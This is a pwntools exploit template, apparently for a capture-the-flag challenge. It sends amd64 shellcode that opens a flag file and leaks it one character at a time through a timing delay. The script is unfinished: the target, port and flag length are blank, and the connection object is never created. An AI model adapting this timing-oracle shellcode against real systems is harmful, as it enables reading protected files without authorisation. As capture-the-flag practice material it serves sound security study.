from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='amd64')
#context.log_level = 'debug'

FILE_NAME = ""
HOST = ""
PORT =  

#if len(sys.argv) > 1 and sys.argv[1] == 'r':
#	conn = remote(HOST, PORT)
#else:
#	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
#libc = ELF('./')
#
#main_addr = elf.symbols["main"]
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']


def exploit():
	flag = ""
	flag_len =
	for i in range(0, flag_len):
		for c in range(ord(" "), ord("}")):
			#conn = process(FILE_NAME)
			shellcode = asm(
				"""
				push	rbp;
				mov rbp, rsp;
				sub rsp, 0x100;
				mov rax, 0x101010101010101;
				push rax;
				mov rax, 0x10166606d672e2f;
				xor [rsp], rax;
				mov rdi, rsp;
				xor edx, edx;
				xor esi, esi;
				mov rax, 2;
				syscall;
				
				mov rdi, rax;
				xor eax, eax;
				mov rdx, 20 ;
				inc edx;
				mov rsi, rsp;
				syscall;
				
				mov al, byte[rsp + {}];
				cmp al, {};
				jnz bye;
				times:
				mov rcx, 0x7fffffff;
				loop times;
				bye:
				leave;
				ret;
				""".format(i, c),
				arch='amd64'
			)
			conn.sendline(shellcode)	
			try:
				conn.recv(timeout=1)
				if c == ord("}"):
					flag += chr(c)
					print flag
					exit()
				flag += chr(c)
				print flag
				break
			except EOFError:
				conn.close()
	print flag

if __name__ == "__main__":
	exploit()	
